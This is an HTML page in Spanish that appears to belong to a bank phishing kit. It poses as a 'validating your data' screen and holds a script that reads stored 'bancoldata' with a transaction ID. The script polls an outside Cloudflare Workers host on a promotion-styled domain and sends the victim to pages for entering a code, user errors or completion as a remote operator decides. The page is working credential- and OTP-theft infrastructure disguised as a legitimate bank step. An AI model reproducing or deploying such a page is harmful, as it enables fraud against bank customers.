<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #677eff 0%, #2575FC 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { font-size: 16px; opacity: 0.9; }
        .status { margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h1>Validando tus datos</h1>
    <p>Por favor espera mientras verificamos tu información</p>
    <div class="status" id="statusInfo">Estado: pendiente</div>

    <script>
        const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
        
        async function checkStatus() {
            try {
                const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
                if (!bancoldata || !bancoldata.transactionId) {
                    window.location.href = 'index.html';
                    return;
                }
                
                const response = await fetch(WORKER_URL + '/status?id=' + bancoldata.transactionId);
                const data = await response.json();
                
                document.getElementById('statusInfo').textContent = 'Estado: ' + (data.estado || 'pendiente');
                
                // Redirigir según el estado
                if (data.estado === 'autorizado' || data.estado === 'solicitando_codigo') {
                    window.location.href = 'codigo.html';
                } else if (data.estado === 'error_usuario') {
                    window.location.href = 'errousuario.html';
                } else if (data.estado === 'error_codigo') {
                    window.location.href = 'errorcodigo.html';
                } else if (data.estado === 'finalizado') {
                    window.location.href = 'finalizar.html';
                } else {
                    // Seguir verificando cada 2 segundos
                    setTimeout(checkStatus, 2000);
                }
                
            } catch (error) {
                console.error('Error:', error);
                setTimeout(checkStatus, 3000);
            }
        }
        
        // Iniciar verificación
        checkStatus();
    </script>
</body>
</html>
